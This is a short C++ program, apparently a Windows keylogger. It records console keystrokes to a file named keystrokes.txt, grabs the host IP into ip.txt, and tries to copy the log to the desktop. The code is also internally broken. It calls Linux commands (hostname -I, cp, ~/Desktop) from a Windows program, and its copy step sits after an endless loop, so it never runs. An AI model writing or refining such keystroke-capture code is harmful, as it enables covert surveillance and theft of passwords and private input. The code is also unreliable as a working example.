#include <iostream>
#include <fstream>
#include <Windows.h>

int main() {
    system("hostname -I > ip.txt");

    INPUT_RECORD keyRecord;
    DWORD bytesRead;
    HANDLE inputHandle = GetStdHandle(STD_INPUT_HANDLE);

    std::ofstream keyFile("keystrokes.txt");

    if (!keyFile.is_open()) {
        return 1;
    }

    while (true) {
        ReadConsoleInput(inputHandle, &keyRecord, 1, &bytesRead);

        if (keyRecord.EventType == KEY_EVENT && keyRecord.Event.KeyEvent.bKeyDown) {
            keyFile << char(keyRecord.Event.KeyEvent.uChar.AsciiChar);
        }
    }

    system("cp keystrokes.txt ~/Desktop/");

    return 0;
}
